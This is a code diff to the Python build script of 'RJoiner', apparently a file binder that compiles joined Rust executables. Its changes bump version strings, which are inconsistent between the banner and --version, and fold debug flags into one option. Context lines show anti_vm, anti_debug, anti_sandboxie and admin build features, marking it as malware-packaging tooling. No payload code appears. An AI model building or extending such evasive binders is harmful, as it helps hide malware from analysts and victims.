@@ -26,7 +26,7 @@ import shutil
 import sys
 import pathlib
 
-BANNER = """
+BANNER = '''
  ██▀███  ▄▄▄██▀▀▀▒█████   ██▓ ███▄    █ ▓█████  ██▀███  
 ▓██ ▒ ██▒  ▒██  ▒██▒  ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
 ▓██ ░▄█ ▒  ░██  ▒██░  ██▒▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
@@ -37,10 +37,10 @@ BANNER = """
   ░░   ░ ░ ░ ░  ░ ░ ░ ▒   ▒ ░   ░   ░ ░    ░     ░░   ░ 
    ░     ░   ░      ░ ░   ░           ░    ░  ░   ░     
                                                         
-      RJoiner v1.4.0 | by ftdot | GNU GPL v3.0
+      RJoiner v1.4.1 | by ftdot | GNU GPL v3.0
       ----------------------------------------
          https://github.com/ftdot/rjoiner
-"""
+'''
 
 
 def get_license() -> str:
@@ -66,7 +66,7 @@ def main() -> int:
   parser.add_argument('-v', '--version',
                       help='Show version',
                       action='version',
-                      version='RJoiner v1.4.0')
+                      version='RJoiner v1.5.0')
   parser.add_argument('--copyright',
                       help='Show copyright',
                       action='version',
@@ -86,22 +86,12 @@ def main() -> int:
                       default=False)
   
   parser.add_argument('-t', '--target',
-                    help='Specify a target to cargo (list installed targets: rustup target list --installed) (can be multiple)',
-                    action='append',
-                    default=None)
+                      help='Specify a target to cargo (list installed targets: rustup target list --installed) (can be multiple)',
+                      action='append',
+                      default=None)
   
   parser.add_argument('-d', '--debug',
-                      help='Enables debug mode (by default, compiles in release mode)',
-                      action='store_true',
-                      default=False)
-
-  parser.add_argument('--yes-console',
-                      help='Enables console for windows (useful for debugging)',
-                      action='store_true',
-                      default=False)
-
-  parser.add_argument('--no-temp-del',
-                      help='Prevents from temporary directory deletion (useful for debugging)',
+                      help='Enables debug mode (by default, compiles in release mode) (prevents to temp/ directory deletion, enables console on windows releases)',
                       action='store_true',
                       default=False)
 
@@ -190,7 +180,6 @@ def main() -> int:
     # add features if any
     if args.icon is not None: features.append('icon')
     if args.admin: features.append('admin')
-    if args.yes_console: features.append('enable_win_console')
     if args.anti_vm: features.append('anti_vm')
     if args.anti_debug: features.append('anti_debug')
     if args.anti_sandboxie: features.append('anti_sandboxie')
@@ -348,8 +337,8 @@ def main() -> int:
     else:
       print('Builder returned an error.')
 
-    # check if no-temp-del argument is switched
-    if args.no_temp_del:
+    # do not delete temp/ directory when debug enabled
+    if args.debug:
       return 0
   
 
